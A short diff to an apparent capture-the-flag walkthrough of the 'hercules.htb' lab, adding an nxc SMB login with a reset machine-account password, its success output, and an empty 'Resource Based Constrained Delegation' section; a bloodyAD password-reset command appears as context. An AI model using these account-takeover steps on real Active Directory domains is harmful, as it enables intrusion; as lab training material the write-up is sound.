@@ -1548,7 +1548,19 @@ bloodyAD --host dc.hercules.htb -d hercules.htb -k set password 'iis_webserver$'
 
 Then change the password!
 
+```python
+nxc smb dc.hercules.htb -u 'iis_webserver$' -p 'Password123!' -k          
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\iis_webserver$:Password123!
+```
 
+This user is now compromised!
+
+# Resource Based Constrained Delegation
+
+```python
+
+```
 
 
 
